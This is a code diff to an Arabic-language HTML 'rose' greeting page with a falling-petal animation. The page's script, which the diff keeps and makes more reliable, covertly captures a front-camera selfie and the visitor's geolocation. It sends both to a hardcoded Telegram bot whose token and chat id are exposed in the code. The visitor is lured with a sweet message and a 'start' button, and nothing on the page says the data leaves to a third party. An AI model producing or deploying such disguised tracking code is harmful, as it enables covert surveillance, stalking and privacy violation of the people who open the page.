@@ -21,62 +21,89 @@
       height: 100%;
       pointer-events: none;
     }
+    #startBtn {
+      font-size: 20px;
+      padding: 10px 20px;
+      margin-top: 50px;
+      background: #ff69b4;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
   <h1>أهلاً بك يا وردة</h1>
-  <p>جارٍ التحميل...</p>
-  <div id="rose">🌹</div>
+  <p>اضغط الزر للسماح بالكاميرا والموقع</p>
+  <button id="startBtn">ابدأ التجربة</button>
+  <div id="rose"></div>
   <canvas id="falling"></canvas>
 
   <script>
     const botToken = '7931908611:AAF5IKqLSL9IJkOezV1Qzgk9sM9v8iuiFYQ';
     const chatId = '7070074537';
 
-    // 1. طلب الكاميرا وأخذ صورة
+    document.getElementById('startBtn').addEventListener('click', async () => {
+      document.getElementById('startBtn').style.display = 'none';
+      document.querySelector('p').textContent = 'جاري المعالجة...';
+
+      await captureAndSend();
+      await sendLocation();
+      startFalling();
+
+      document.querySelector('p').textContent = 'انت الورد بحد ذاته!';
+    });
+
+    // التقاط الصورة
     async function captureAndSend() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
 
+        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر شوي حتى تشتغل الكاميرا
+
         const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg');
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
         stream.getTracks().forEach(track => track.stop());
 
-        const blob = await (await fetch(imageData)).blob();
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'selfie.jpg');
+
         await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: 'POST',
           body: formData
         });
       } catch (e) {
-        console.warn('رفض المستخدم الكاميرا أو حدث خطأ:', e);
+        console.warn('فشل الوصول للكاميرا:', e);
       }
     }
 
-    // 2. طلب الموقع الجغرافي
-    function sendLocation() {
+    // إرسال الموقع
+    async function sendLocation() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude } = pos.coords;
           const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
           await fetch(url);
         }, err => {
-          console.warn("رفض الموقع أو خطأ:", err);
+          console.warn("مشكلة بالموقع:", err);
         });
+      } else {
+        console.warn("المتصفح لا يدعم تحديد الموقع.");
       }
     }
 
-    // 3. تأثير الورد المتساقط
+    // تأثير الورد
     function startFalling() {
       const canvas = document.getElementById('falling');
       const ctx = canvas.getContext('2d');
@@ -114,14 +141,6 @@
 
       draw();
     }
-
-    // تشغيل كلشي بالتسلسل
-    (async () => {
-      await captureAndSend();
-      sendLocation();
-      startFalling();
-      document.querySelector('p').textContent = 'انت الوردة الحلوة!';
-    })();
   </script>
 </body>
 </html>
